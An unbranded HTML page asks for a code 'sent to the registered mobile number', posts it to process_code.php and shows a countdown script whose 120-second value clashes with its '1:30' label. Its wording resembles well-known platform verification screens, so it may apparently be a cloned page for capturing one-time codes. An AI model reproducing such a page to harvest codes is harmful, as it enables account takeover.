    <div class="container">
              <h1>Check your text messages</h1>
                      <p >Enter the code that we sent to the registered mobile number. </p>
        <img src="code.jpeg" alt="Shield Icon">
        <form action="process_code.php" method="POST">
            <input type="text" id="code" name="code" placeholder="Code" required>
                    <p class="timer">We can send a new code in <span id="countdown">1:30</span>.</p>
            <div class="checkbox-container">
                <input type="checkbox" id="trust" name="trust">
                <label for="trust">Trust this device and skip this step from now on</label>
            </div>
            <button type="submit">Continue</button>
        </form>
        <button class="try">Try another way</button>
    </div>
    <script>
        // Countdown Timer
        let countdownElement = document.getElementById('countdown');
        let timeLeft = 120; // 90 seconds (1:30)

        function updateCountdown() {
            let minutes = Math.floor(timeLeft / 60);
            let seconds = timeLeft % 60;

            // Format time to always show two digits for seconds
            seconds = seconds < 10 ? '0' + seconds : seconds;

            // Update the countdown text
            countdownElement.textContent = `${minutes}:${seconds}`;

            // Decrement time left
            if (timeLeft > 0) {
                timeLeft--;
            } else {
                clearInterval(timer); // Stop the timer when it reaches 0
            }
        }

        // Start the countdown timer
        let timer = setInterval(updateCountdown, 1000);
    </script>
